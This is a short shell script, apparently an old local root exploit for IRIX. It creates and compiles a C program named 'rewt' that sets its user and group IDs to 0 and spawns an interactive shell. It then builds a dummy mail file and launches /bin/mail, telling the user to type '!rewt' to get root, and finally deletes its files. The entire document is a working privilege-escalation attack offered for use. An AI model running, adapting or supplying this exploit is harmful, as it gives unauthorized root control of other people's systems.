#!/bin/sh
MAIL="/bin/mail"
RM="/bin/rm -f"
CC="/usr/bin/cc"
OS="IRIX"

if  [ ".`uname -s`" != ".$OS" ];  then
  echo "this box is not running $OS !"
  exit 1
fi
echo "creating rewt.c"
cat >rewt.c <<'EOF'
main()
{
setuid(0);
setgid(0);
system("/bin/sh -i");
}
EOF
echo "compiling..."
$CC -o rewt rewt.c
if [ -f rewt ]; then
  echo "done"
  $RM rewt.c
else
  echo "unable to compile rewt.c"
  $RM rewt.c
  exit 1
fi
# make dummy mail file for -f
echo "making dummy mail file"
cat >dummymail <<'EOF'
From mr.haqr@bogus.host.edu Sun Oct 30 00:00:00 1994
Return-Path: </dev/null>
Message-Id: <m0r1RBj-0003gkC@bogus.host.edu>
From: mr.haqr (Mr. Haqr)
Subject: Irix is secure!!@#%$^
To: root (root)
Date: Sun, 30 Oct 1994 00:00:00

gimme sum rewt d00d!
<insert l0ck motd here>

EOF
echo "running $MAIL, type '!rewt' to get root, exit  with 'exit' and then 'q'"
$MAIL -f dummymail
echo "deleting evil files"
$RM dummymail rewt rewt.c

exit 0

